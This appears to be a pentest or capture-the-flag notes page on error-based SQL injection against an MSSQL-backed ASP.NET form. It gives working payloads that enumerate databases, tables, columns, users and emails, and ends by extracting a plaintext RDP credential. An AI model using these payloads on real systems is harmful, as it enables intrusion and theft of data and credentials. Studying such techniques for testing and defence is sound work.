---
description: MSSQL
---

# ERROR BASED

There is a form.

SQL Injection.

```
' - Error
'' - Error disappears
```

https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

https://portswigger.net/web-security/sql-injection/cheat-sheet

It should be MSSQL. Because of ASP.NET web service. Try that.

Specify String Concatenation

```
'+(SELECT '')+'
```

You can also exploit this behavior to test conditions.

```
'+(SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END)+'
```

We can see error page. So we can try using transformation errors than time based errors.

[https://ozguralp.medium.com/turning-blind-error-based-sql-injection-into-an-exploitable-boolean-one-85d6be3ca23b](https://ozguralp.medium.com/turning-blind-error-based-sql-injection-into-an-exploitable-boolean-one-85d6be3ca23b)

```
'+convert(id,db_name())+'  ERROR
'+convert(char,db_name())+'  OK

'+convert(char,(SELECT IIF(SUBSTRING(DB_NAME(),1,1)='A',3,@@VERSION)))+'
```

This query was working as this:&#x20;

* Sub-stringing the database name starting from 1st character within 1 length and comparing within ‘A’ character whether it equals or not.
* If that character equals to ‘A’, then it returns 3 as integer.
* Converting ‘3’ as integer to char is successful and returns without any errors, meaning that the query is true.
* If the character does not equal to ‘A’, then it returns @@VERSION as T-SQL functionality.
* Converting @@VERSION result to char is not successful and returns error (Error.aspx page), meaning that the query is false!

```
'+convert(char,(SELECT IIF(SUBSTRING(HOST_NAME(),1,1)='A',3,@@VERSION)))+'

Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64)
Aug 22 2017 17:04:49
Copyright (C) 2017 Microsoft Corporation
Express Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

```
%2bconvert(char,(SELECT IIF(SUBSTRING((***query_here***),1,1)='d',3,@@VERSION)))%2b

'+convert(char,(SELECT IIF(SUBSTRING((select top 1 table_name from INFORMATION_SCHEMA.tables),1,1)='A',3,@@VERSION)))+'
```

https://www.exploit-db.com/papers/12975

```
'+convert(int,(user_name()))+' - appuser

'+(SELECT CASE WHEN (is_srvrolemember('sysadmin', 'appuser')=0) THEN 1/0 ELSE NULL END)+' - Nope 

'+(SELECT CASE WHEN (is_srvrolemember('sysadmin')=1) THEN 1/0 ELSE NULL END)+' - True
```

:( - If it is equal to 1, we can execute xp\_cmdshell command. So we can not execute the command anyways.

https://infosecwriteups.com/exploiting-error-based-sql-injections-bypassing-restrictions-ed099623cd94

```
'+(convert(int,(select top 1 table_name from information_schema.tables)))+'
```

The above query will retrieve the top table\_name from the database.

Conversion failed when converting the nvarchar value 'users' to data type int.

Got a good table if not,

```
convert(int,(select top 1 table_name from information_schema.tables where table_name not in ('Download_Document','login_audit')))  
- Keep going find a proper table name

'+convert(int,(select top 1 table_name from information_schema.tables where table_name not in ('users')))+' 
- There is no other
```

```
'+convert(int,(select top 1 column_name from information_schema.columns where table_name='users'))+'

id

'+convert(int,(select top 1 column_name from information_schema.columns where table_name not in ('id')))+'

email
username

'+convert(int,(select top 1 column_name from information_schema.columns where column_name not in ('id','email','username')))+'

'+convert(int,(select top 1 username from users where username not in ('test','test2'')))+'

test, test2

'+convert(int,(select top 1 email from users where email not in ('test@test.local','test2@test.local')))+'
```

We can not go further with these.

https://github.com/shauntdergrigorian/CTF-Notes

```
'+convert(int,(SELECT top 1 DB_NAME(6)))+'

archive

'+convert(int,(SELECT top 1 DB_NAME(6)))+'

Getting other db - DB_NAME(i) 0<i<7(To get no error)

'+convert(int,(Select top 1 name from archive..syscolumns))+'

'+convert(int,(Select top 1 name from archive..syscolumns where name 
not in ('alogin','id','psw')))+'

'+convert(int,(SELECT top 1 alogin FROM archive..pmanager where alogin 
not in ('REDACTED', 'REDACTED','REDACTED','carl')))+'

'+convert(int,(SELECT top 1 psw FROM archive..pmanager where psw not in 
('REDACTED','REDACTED',
'REDACTED','REDACTED')))+'

'+convert(int,(select top 1 column_name from archive..pmanager.alogin))+'

carl: passpass123 - RDP Credential
```
